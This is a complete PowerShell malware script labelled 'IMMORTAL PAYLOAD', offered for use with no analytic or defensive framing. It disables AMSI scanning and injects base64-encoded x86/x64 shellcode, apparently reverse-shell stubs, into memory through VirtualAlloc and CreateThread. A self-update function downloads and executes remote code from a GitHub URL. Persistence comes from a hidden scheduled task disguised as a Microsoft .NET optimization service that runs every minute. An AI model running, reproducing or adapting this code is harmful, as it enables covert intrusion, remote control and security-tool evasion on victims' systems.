# === CORRECTED IMMORTAL PAYLOAD ===
# AMSI Bypass (enhanced)
[Runtime.InteropServices.Marshal]::WriteInt32(
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
        'amsiInitFailed', 
        [System.Reflection.BindingFlags]'NonPublic,Static'
    ).GetValue($null), 1
)

# Memory injection class (fixed)
$injCode = @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId
    );
    
    public static void Run(byte[] sc) {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        IntPtr threadId;
        CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out threadId);
    }
}
"@

try {
    Add-Type -TypeDefinition $injCode -WarningAction SilentlyContinue
}
catch {
    Write-Verbose "Injection class already loaded" -Verbose
}

# Architecture-aware shellcodes
$shellcodes = @{
    x86 = [Convert]::FromBase64String('/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQi0I8VwHQi0B4hcB0TAHQi1ggUAHTi0gYhcl0PEkx/4s0iwHWMcDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/Vagpok7ndGWgCAPSkieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoZwAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0oWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCQPhXD////pm////wHDKcZ1wcO78LWiVmoAU//V')
    x64 = [Convert]::FromBase64String('/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgSItSGEiLUiBWSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAPSkk7ndGUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V')
}

# Self-updating core
function Update-Phoenix {
    $url = "https://github.com/mitasahi/root/raw/main/ps-persist.ps1.tar.gz"
    
    try {
        $web = New-Object Net.WebClient
        $tarData = $web.DownloadData($url)
        $ms = New-Object IO.MemoryStream(,$tarData)
        $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
        $msOutput = New-Object IO.MemoryStream
        $gz.CopyTo($msOutput)
        $rawBytes = $msOutput.ToArray()
        iex ([Text.Encoding]::UTF8.GetString($rawBytes))
        exit
    }
    catch {
        Write-Warning "Update failed: $_"
    }
    finally {
        if ($web) { $web.Dispose() }
        [GC]::Collect()
    }
}

# Persistence mechanism (fixed XML)
function Install-Phoenix {
    $taskXml = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Microsoft .NET Framework Optimization Service</Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2023-01-01T09:00:00</StartBoundary>
      <Repetition>
        <Interval>PT1M</Interval>
      </Repetition>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-Window Hidden -Exec Bypass -C "Update-Phoenix"</Arguments>
    </Exec>
  </Actions>
</Task>
'@

    $tempFile = [System.IO.Path]::GetTempFileName()
    $taskXml | Out-File $tempFile -Encoding Unicode
    schtasks /create /xml $tempFile /tn "Microsoft .NET Optimization" /f | Out-Null
    Remove-Item $tempFile -Force
}

# Main execution
try {
    Install-Phoenix
    
    # Execute appropriate shellcode
    if ([Environment]::Is64BitProcess) {
        [Injector]::Run($shellcodes.x64)
    }
    else {
        [Injector]::Run($shellcodes.x86)
    }

    # Maintenance loop
    while ($true) {
        Update-Phoenix
        Start-Sleep -Seconds 60
    }
}
catch {
    Write-Error "Fatal error: $_"
    exit 1
}
